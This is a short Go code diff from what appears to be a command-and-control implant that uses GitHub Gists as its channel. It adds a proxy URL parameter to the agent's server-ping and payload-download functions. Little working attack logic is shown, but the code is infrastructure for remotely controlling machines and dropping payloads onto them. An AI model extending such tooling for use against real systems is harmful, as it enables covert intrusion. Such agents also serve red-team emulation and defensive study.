@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"net/url"
 
 	"../execute"
 	"../output"
@@ -35,7 +36,7 @@ func init() {
 }
 
 //Ping tests connectivity to the server
-func (contact GIST) Ping(server string) bool {
+func (contact GIST) Ping(server string, c2ProxyUrl *url.URL) bool {
 	ctx := context.Background()
 	c2Client := createNewClient()
 	user, _, err := c2Client.Users.Get(ctx, "")
@@ -69,7 +70,7 @@ func (contact GIST) GetInstructions(profile map[string]interface{}) map[string]i
 }
 
 //DropPayloads downloads all required payloads for a command
-func (contact GIST) DropPayloads(payload string, server string, uniqueId string) []string {
+func (contact GIST) DropPayloads(payload string, server string, uniqueId string, c2ProxyUrl *url.URL) []string {
 	payloadNames := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	if len(payloadNames) > 0 {
 		return gistPayloadDrop(uniqueId, payloadNames)
